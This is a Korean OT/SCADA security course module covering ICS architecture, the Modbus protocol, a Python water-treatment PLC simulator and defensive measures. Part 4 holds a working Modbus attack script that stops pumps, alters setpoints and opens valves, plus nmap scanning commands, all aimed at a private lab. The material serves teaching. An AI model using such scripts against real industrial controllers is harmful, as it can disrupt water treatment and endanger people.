# Week 12: OT/SCADA 기초

## 학습 목표
- OT(Operational Technology)와 SCADA 시스템의 아키텍처를 이해한다
- Modbus 프로토콜의 동작 원리와 보안 취약점을 분석한다
- PLC와 HMI의 역할 및 공격 벡터를 파악한다
- Python pymodbus를 이용한 Modbus 시뮬레이션을 수행한다
- OT/SCADA 보안 대책을 수립한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| attacker | 10.20.30.201 | 공격/분석 머신 | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | SCADA 시뮬레이터 | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh) | `ssh ccc@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | OT/SCADA 이론 (Part 1) | 강의 |
| 0:40-1:10 | Modbus 프로토콜 심화 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | Modbus 시뮬레이션 실습 (Part 3) | 실습 |
| 2:00-2:40 | SCADA 공격 실습 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | OT 보안 대책 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

## Part 1: OT/SCADA 이론 (40분)

### 1.1 IT vs OT 비교

| 항목 | IT | OT |
|------|----|----|
| 우선순위 | CIA (기밀성-무결성-가용성) | AIC (가용성-무결성-기밀성) |
| 수명 | 3-5년 | 15-25년 |
| 패치 | 정기적 | 매우 드묾 (다운타임 불가) |
| OS | 최신 Windows/Linux | Windows XP, 레거시 RTOS |
| 프로토콜 | TCP/IP, HTTP, TLS | Modbus, DNP3, OPC-UA |
| 보안 | 방화벽, IDS, AV | 물리적 격리 (에어갭) |
| 사고 영향 | 데이터 유출, 금전 | 물리적 피해, 인명 |

### 1.2 Purdue 모델 (ICS 아키텍처)

```
Level 5: Enterprise Network     ← 인터넷, 이메일, ERP
─────────────── DMZ ──────────────
Level 4: Business Planning      ← IT 네트워크
─────────────── FW ──────────────
Level 3: Operations Management  ← 히스토리안, MES
─────────────── FW ──────────────
Level 2: Supervisory Control    ← HMI, SCADA 서버
Level 1: Basic Control          ← PLC, RTU, DCS
Level 0: Physical Process       ← 센서, 액추에이터, 모터
```

### 1.3 주요 ICS 구성 요소

| 구성 요소 | 설명 | 예시 |
|-----------|------|------|
| PLC | 프로그래머블 로직 컨트롤러 | Siemens S7, Allen-Bradley |
| RTU | 원격 터미널 유닛 | 원격 데이터 수집 |
| HMI | 사람-기계 인터페이스 | 모니터링 화면 |
| SCADA | 감시 제어 데이터 수집 | 중앙 관리 시스템 |
| DCS | 분산 제어 시스템 | 공장 자동화 |
| 히스토리안 | 데이터 기록/분석 | OSIsoft PI |

### 1.4 ICS 보안 사고 사례

| 사건 | 연도 | 대상 | 프로토콜 | 영향 |
|------|------|------|----------|------|
| Stuxnet | 2010 | 이란 핵시설 | S7comm | 원심분리기 파괴 |
| BlackEnergy | 2015 | 우크라이나 전력 | OPC-DA | 대규모 정전 |
| TRITON | 2017 | 사우디 석유화학 | TriStation | 안전시스템 무력화 |
| Industroyer | 2016 | 우크라이나 전력 | IEC 61850 | 정전 |
| Colonial Pipeline | 2021 | 미국 송유관 | IT→OT | 연료 공급 중단 |

---

## Part 2: Modbus 프로토콜 심화 (30분)

### 2.1 Modbus 개요

Modbus는 1979년 Modicon이 개발한 산업 통신 프로토콜이다.

**Modbus 변종:**
| 변종 | 전송 | 포트 | 특성 |
|------|------|------|------|
| Modbus RTU | RS-485 시리얼 | - | 바이너리, CRC |
| Modbus ASCII | RS-485 시리얼 | - | ASCII, LRC |
| Modbus TCP | TCP/IP | 502 | 이더넷 기반 |

### 2.2 Modbus 데이터 모델

| 오브젝트 | 타입 | 접근 | 주소 범위 |
|----------|------|------|-----------|
| Coils | 비트 | R/W | 0-65535 |
| Discrete Inputs | 비트 | R | 0-65535 |
| Holding Registers | 16비트 워드 | R/W | 0-65535 |
| Input Registers | 16비트 워드 | R | 0-65535 |

### 2.3 Modbus 함수 코드

| 코드 | 함수 | 설명 |
|------|------|------|
| 0x01 | Read Coils | 코일 읽기 |
| 0x02 | Read Discrete Inputs | 이산 입력 읽기 |
| 0x03 | Read Holding Registers | 보유 레지스터 읽기 |
| 0x04 | Read Input Registers | 입력 레지스터 읽기 |
| 0x05 | Write Single Coil | 단일 코일 쓰기 |
| 0x06 | Write Single Register | 단일 레지스터 쓰기 |
| 0x0F | Write Multiple Coils | 다중 코일 쓰기 |
| 0x10 | Write Multiple Registers | 다중 레지스터 쓰기 |

### 2.4 Modbus TCP 프레임

```
┌──────────────────────────────────────────────────┐
│ MBAP Header (7 bytes)  │ PDU (Function + Data)   │
├──────┬────────┬────────┼──────┬─────────────────┤
│Trans │Protocol│Length  │Unit  │Function│Data     │
│ID(2B)│ID(2B)  │(2B)   │ID(1B)│Code(1B)│(N bytes)│
└──────┴────────┴────────┴──────┴────────┴─────────┘

보안 문제:
- 인증 없음 (누구나 읽기/쓰기)
- 암호화 없음 (평문 전송)
- 무결성 검증 없음 (변조 가능)
```

---

## Part 3: Modbus 시뮬레이션 실습 (40분)

### 3.1 Modbus 서버 (PLC 시뮬레이터)

```bash
pip3 install pymodbus

cat << 'PYEOF' > /tmp/modbus_plc_sim.py
#!/usr/bin/env python3
"""Modbus PLC 시뮬레이터 — 수처리 시설"""
from pymodbus.server import StartTcpServer
from pymodbus.datastore import ModbusSequentialDataBlock, ModbusSlaveContext, ModbusServerContext
from pymodbus.device import ModbusDeviceIdentification
import threading
import time
import random

# 데이터 저장소 초기화
# Coils: 펌프/밸브 상태 (0=OFF, 1=ON)
coils = ModbusSequentialDataBlock(0, [0]*100)
coils.setValues(1, [1, 1, 0, 1, 0])  # 펌프1:ON, 펌프2:ON, 밸브1:OFF, 펌프3:ON, 밸브2:OFF

# Holding Registers: 설정값
hr = ModbusSequentialDataBlock(0, [0]*100)
hr.setValues(1, [
    250,   # 0: 목표 수위 (cm)
    70,    # 1: 펌프 속도 (%)
    350,   # 2: 염소 농도 목표 (ppb)
    6500,  # 3: pH 목표 (x1000, 6.5)
    1000,  # 4: 유량 목표 (L/min)
])

# Input Registers: 센서 값 (읽기 전용)
ir = ModbusSequentialDataBlock(0, [0]*100)

# Discrete Inputs: 경보 상태
di = ModbusSequentialDataBlock(0, [0]*100)

store = ModbusSlaveContext(
    di=di, co=coils, hr=hr, ir=ir
)
context = ModbusServerContext(slaves=store, single=True)

def update_sensors():
    """센서 데이터 시뮬레이션"""
    while True:
        # 현재 펌프 상태에 따른 센서값 업데이트
        pump1_on = coils.getValues(1, 1)[0]
        pump2_on = coils.getValues(2, 1)[0]
        
        water_level = 200 + (pump1_on * 30) + (pump2_on * 20) + random.randint(-10, 10)
        flow_rate = (pump1_on * 500) + (pump2_on * 400) + random.randint(-50, 50)
        pressure = 30 + (pump1_on * 15) + (pump2_on * 10) + random.randint(-3, 3)
        temp = 220 + random.randint(-10, 10)  # 22.0C (x10)
        ph = 6800 + random.randint(-200, 200)  # 6.8 (x1000)
        chlorine = 300 + random.randint(-50, 50)  # 300 ppb
        turbidity = 5 + random.randint(0, 10)  # NTU (x10)
        
        ir.setValues(1, [
            water_level,  # 0: 수위 (cm)
            flow_rate,    # 1: 유량 (L/min)
            pressure,     # 2: 압력 (PSI x10)
            temp,         # 3: 온도 (C x10)
            ph,           # 4: pH (x1000)
            chlorine,     # 5: 잔류염소 (ppb)
            turbidity,    # 6: 탁도 (NTU x10)
        ])
        
        # 경보 상태 업데이트
        alarms = [
            1 if water_level > 280 else 0,  # 고수위 경보
            1 if water_level < 150 else 0,  # 저수위 경보
            1 if pressure > 60 else 0,      # 고압 경보
            1 if ph < 6000 or ph > 8000 else 0,  # pH 이상
        ]
        di.setValues(1, alarms)
        
        time.sleep(2)

# 센서 업데이트 스레드 시작
sensor_thread = threading.Thread(target=update_sensors, daemon=True)
sensor_thread.start()

# Modbus 서버 정보
identity = ModbusDeviceIdentification()
identity.VendorName = 'WaterTech Inc.'
identity.ProductCode = 'WTP-3000'
identity.VendorUrl = 'http://watertech.local'
identity.ProductName = 'Water Treatment PLC'
identity.ModelName = 'WTP-3000'
identity.MajorMinorRevision = '2.1.0'

print("[*] Modbus PLC 시뮬레이터 시작 (수처리 시설)")
print("[*] 포트: 5020 (교육용)")
print("[*] Unit ID: 1")
print("[*] Coils 0-4: 펌프/밸브 상태")
print("[*] Holding Registers 0-4: 설정값")
print("[*] Input Registers 0-6: 센서 값")

StartTcpServer(context=context, identity=identity, address=("0.0.0.0", 5020))
PYEOF

python3 /tmp/modbus_plc_sim.py &
sleep 2
echo "[+] Modbus PLC 시뮬레이터 실행중"
```

### 3.2 Modbus 클라이언트 (모니터링)

```bash
cat << 'PYEOF' > /tmp/modbus_monitor.py
#!/usr/bin/env python3
"""Modbus 모니터링 클라이언트"""
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient('10.20.30.80', port=5020)
client.connect()

print("=== 수처리 시설 모니터링 ===\n")

# 센서 데이터 읽기 (Input Registers)
result = client.read_input_registers(0, 7, slave=1)
if not result.isError():
    regs = result.registers
    print(f"[센서 데이터]")
    print(f"  수위: {regs[0]} cm")
    print(f"  유량: {regs[1]} L/min")
    print(f"  압력: {regs[2]/10:.1f} PSI")
    print(f"  온도: {regs[3]/10:.1f} C")
    print(f"  pH: {regs[4]/1000:.2f}")
    print(f"  잔류염소: {regs[5]} ppb")
    print(f"  탁도: {regs[6]/10:.1f} NTU")

# 펌프/밸브 상태 (Coils)
result = client.read_coils(0, 5, slave=1)
if not result.isError():
    names = ['펌프1', '펌프2', '밸브1', '펌프3', '밸브2']
    print(f"\n[장비 상태]")
    for i, bit in enumerate(result.bits[:5]):
        print(f"  {names[i]}: {'ON' if bit else 'OFF'}")

# 설정값 (Holding Registers)
result = client.read_holding_registers(0, 5, slave=1)
if not result.isError():
    names = ['목표수위(cm)', '펌프속도(%)', '염소목표(ppb)', 'pH목표(x1000)', '유량목표(L/min)']
    print(f"\n[설정값]")
    for i, val in enumerate(result.registers):
        print(f"  {names[i]}: {val}")

# 경보 상태 (Discrete Inputs)
result = client.read_discrete_inputs(0, 4, slave=1)
if not result.isError():
    alarms = ['고수위', '저수위', '고압', 'pH이상']
    print(f"\n[경보 상태]")
    for i, bit in enumerate(result.bits[:4]):
        print(f"  {alarms[i]}: {'ALARM!' if bit else 'OK'}")

client.close()
PYEOF

python3 /tmp/modbus_monitor.py
```

---

## Part 4: SCADA 공격 실습 (40분)

### 4.1 Modbus 공격

```bash
cat << 'PYEOF' > /tmp/modbus_attack.py
#!/usr/bin/env python3
"""Modbus 공격 시뮬레이션 (교육용)"""
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient('10.20.30.80', port=5020)
client.connect()

print("=" * 50)
print("SCADA 공격 시뮬레이션 (교육용)")
print("=" * 50)

# 공격 1: 정보 수집
print("\n[Attack 1] 레지스터 전체 스캔")
for func, name in [(3, 'Holding'), (4, 'Input')]:
    print(f"  Scanning {name} Registers 0-19...")
    if func == 3:
        result = client.read_holding_registers(0, 20, slave=1)
    else:
        result = client.read_input_registers(0, 20, slave=1)
    if not result.isError():
        for i, val in enumerate(result.registers):
            if val != 0:
                print(f"    Register {i}: {val}")

# 공격 2: 펌프 정지 (Coil 쓰기)
print("\n[Attack 2] 펌프 강제 정지")
print("  [!] 펌프1 OFF...")
client.write_coil(0, False, slave=1)
print("  [!] 펌프2 OFF...")
client.write_coil(1, False, slave=1)
time.sleep(1)

result = client.read_coils(0, 5, slave=1)
if not result.isError():
    print(f"  펌프 상태: {['ON' if b else 'OFF' for b in result.bits[:5]]}")
    print("  [!] 모든 펌프 정지 → 수처리 중단!")

# 공격 3: 설정값 변조
print("\n[Attack 3] 설정값 변조")
print("  [!] 목표 수위: 250 → 999")
client.write_register(0, 999, slave=1)
print("  [!] 펌프 속도: 70% → 100%")
client.write_register(1, 100, slave=1)

# 공격 4: 밸브 전체 열기
print("\n[Attack 4] 밸브 전체 개방")
client.write_coil(2, True, slave=1)  # 밸브1 열기
client.write_coil(4, True, slave=1)  # 밸브2 열기
print("  [!] 모든 밸브 개방 → 오버플로우 위험!")

# 공격 결과 확인
time.sleep(2)
print("\n[결과] 현재 시스템 상태:")
result = client.read_input_registers(0, 7, slave=1)
if not result.isError():
    r = result.registers
    print(f"  수위: {r[0]}cm (정상 범위: 200-280)")
    print(f"  유량: {r[1]}L/min")
    print(f"  압력: {r[2]/10:.1f}PSI")

# 복원
print("\n[복원] 정상 상태 복원...")
client.write_coil(0, True, slave=1)
client.write_coil(1, True, slave=1)
client.write_coil(2, False, slave=1)
client.write_coil(4, False, slave=1)
client.write_register(0, 250, slave=1)
client.write_register(1, 70, slave=1)
print("  [+] 복원 완료")

client.close()
PYEOF

python3 /tmp/modbus_attack.py
```

### 4.2 nmap Modbus 스크립트

```bash
# Modbus 서비스 탐지
nmap -sV -p 502,5020 --script modbus-discover 10.20.30.80

# Modbus Device ID 읽기
nmap -p 5020 --script modbus-discover --script-args modbus-discover.aggressive=true 10.20.30.80
```

---

## Part 5: OT 보안 대책 (30분)

### 5.1 ICS 보안 프레임워크

| 프레임워크 | 기관 | 대상 |
|-----------|------|------|
| NIST SP 800-82 | NIST | ICS 보안 가이드 |
| IEC 62443 | IEC | 산업 자동화 보안 |
| NERC CIP | NERC | 전력 인프라 |
| ISA/IEC 62443 | ISA | 산업 사이버보안 |

### 5.2 OT 보안 체크리스트

| 항목 | 대책 |
|------|------|
| 네트워크 분리 | IT/OT 경계 방화벽, DMZ |
| 프로토콜 보안 | Modbus TCP → OPC-UA (인증+암호화) |
| 접근 제어 | 화이트리스트, RBAC |
| 모니터링 | IDS/IPS (Suricata OT 규칙) |
| 패치 관리 | 가상 패치, 보상 통제 |
| 물리 보안 | 잠금 캐비닛, 접근 로깅 |
| 사고 대응 | ICS 전용 IR 계획 |

### 5.3 Modbus 보안 강화

```
현재 상태 (취약):
  Client ──── Modbus TCP (평문, 미인증) ──── PLC

보안 강화 방안:
  1. VPN/TLS 터널링
     Client ── [VPN/TLS] ── Modbus ── PLC

  2. 방화벽 규칙
     허용: 특정 IP만 502 포트 접근
     차단: Write 함수 코드 (0x05, 0x06, 0x0F, 0x10)

  3. OPC-UA 전환
     Client ── OPC-UA (TLS + X.509 인증) ── Server
```

---

## Part 6: 복습 퀴즈 + 과제 안내 (20분)

### 퀴즈

1. Modbus TCP의 기본 포트는?
2. IT와 OT의 보안 우선순위 차이는?
3. Stuxnet이 공격한 대상과 프로토콜은?
4. Modbus에 인증/암호화가 없는 이유는?
5. Purdue 모델의 Level 1과 Level 2는?

### 퀴즈 정답

1. 502/TCP
2. IT: CIA(기밀성 우선), OT: AIC(가용성 우선)
3. 이란 나탄즈 핵시설의 Siemens S7-300 PLC, S7comm 프로토콜
4. 1979년 설계 시 폐쇄 네트워크 가정, 보안 고려 없음
5. Level 1: Basic Control(PLC, RTU), Level 2: Supervisory Control(HMI, SCADA)

### 과제

- Modbus PLC 시뮬레이터를 확장하여 새로운 센서를 추가하시오
- Modbus 공격을 탐지하는 Suricata 규칙을 작성하시오
- IT/OT 경계 보안 설계서를 작성하시오

---

## 참고 자료

- Modbus 사양: https://modbus.org/
- NIST SP 800-82: ICS 보안 가이드
- IEC 62443: 산업 사이버보안 표준
- pymodbus: https://github.com/pymodbus-dev/pymodbus
- Conpot (ICS 허니팟): https://github.com/mushorg/conpot
